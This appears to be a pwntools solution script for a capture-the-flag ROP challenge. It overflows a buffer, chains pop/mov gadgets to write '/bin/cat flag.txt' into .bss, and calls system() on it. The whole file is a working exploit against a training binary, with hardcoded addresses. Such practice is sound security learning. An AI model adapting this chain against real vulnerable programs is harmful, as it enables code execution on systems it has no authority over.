from pwn import *

#17Bytes #/bin/cat flag.txt
cmd = [0x6e69622f,0x7461632f,0x616c6620,0x78742e67,0x00000074]

system_addr = p32(0x08048430)
section_bss_addr = 0x0804a040       #size==0x2c==44Bytes

mov_gadget_addr = p32(0x08048670)   #mov dword ptr [edi], ebp; ret;
pop_gadget_addr = p32(0x080486da)   #pop edi; pop ebp; ret;

payload = "A"*44

offset = 0
for i in range(len(cmd)):
    payload += pop_gadget_addr
    payload += p32(section_bss_addr+offset)
    payload += p32(cmd[i])
    payload += mov_gadget_addr
    offset += 4

payload += system_addr
payload += pop_gadget_addr
payload += p32(section_bss_addr)

print(payload)
